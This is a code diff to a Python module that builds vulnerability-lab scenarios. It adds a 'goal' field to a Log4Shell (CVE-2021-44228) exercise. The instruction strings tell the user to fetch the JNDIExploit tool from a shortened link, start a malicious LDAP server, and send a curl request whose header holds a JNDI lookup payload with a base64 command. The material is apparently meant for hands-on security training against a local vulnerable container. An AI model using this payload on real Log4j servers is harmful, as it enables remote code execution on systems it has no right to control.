@@ -1,7 +1,5 @@
-from dis import Instruction
 import os
 import json
-from scenario import Scenario
 
 scenarios = {}
 scenarios_file = "scenarios.json"
@@ -11,6 +9,37 @@ scenarios['scenarios'] = []
 scenarios['total'] = 0
 scenarios['types'] = []
 scenarios['total_types'] = 0
+
+# region =====Scenario Class=====
+
+class Scenario:
+    
+    # /!\ Whenever you add a new field to the scenario object, make sure you update all the fields in __init__, __str__, CreateDefault() and Parse()
+    def __init__(self, name, description, goal, instructions, base, images, CVE, type, sources):
+        self.name = name
+        self.description = description
+        self.goal = goal
+        self.instructions = instructions
+        self.base = base
+        self.images = images
+        self.cve = CVE
+        self.type = type
+        self.sources = sources
+
+    def __str__(self):
+        scenario = {}
+        scenario['name'] = self.name
+        scenario['description'] = self.description
+        scenario['goal'] = self.goal
+        scenario['instructions'] = self.instructions
+        scenario['base'] = self.base
+        scenario['images'] = self.images
+        scenario['CVE'] = self.cve
+        scenario['type'] = self.type
+        scenario['sources'] = self.sources
+        return scenario
+
+# endregion
 
 def Load() -> dict:
     '''
@@ -84,6 +113,7 @@ def CreateDefault():
                    'This vulnerability enables a remote attacker to take control of a device on the internet if the device is running certain unpatched versions of Log4j2.\n'
                    'In December 2021, Apache had to release up to 4 corrective patches to fully close the breach. It is believed that malicious actors likely knew about the vulnerability'
                    ' and exploited it before experts did, hence why it is considered zero-day.')
+    goal = 'Perform remote code execution on the container to do anything you want.'
     instructions = ('1. Download the JNDIExploit from that link -> https://tinyurl.com/yp2n78js then extract it in a dedicated folder.\n'
                     '2. Launch a malicious LDAP server using the command \n"java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888\"\n'
                     "3. Trigger the exploit using the command: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'\n"
@@ -98,7 +128,7 @@ def CreateDefault():
     cve = 'CVE-2021-44228'
     type = 'Remote Code Execution'
     sources = ['https://www.dynatrace.com/news/blog/what-is-log4shell/', 'https://en.wikipedia.org/wiki/Log4Shell', 'https://github.com/christophetd/log4shell-vulnerable-app']
-    scenario = Scenario(name, description, instructions, base, images, cve, type, sources)
+    scenario = Scenario(name, description, goal, instructions, base, images, cve, type, sources)
     Save(scenario)
 
 
@@ -112,6 +142,7 @@ def Parse(_json : dict) -> Scenario:
     '''
     name = _json['name']
     desc = _json['description']
+    goal = _json['goal']
     inst = _json['instructions']
     base = _json['base']
     images = _json['images']
@@ -119,7 +150,7 @@ def Parse(_json : dict) -> Scenario:
     type = _json['type']
     sources = _json['sources']
 
-    scen = Scenario(name, desc, inst, base, images, cve, type, sources)
+    scen = Scenario(name, desc, goal, inst, base, images, cve, type, sources)
     return scen
 
 def LoadScenario(name : str) -> Scenario:
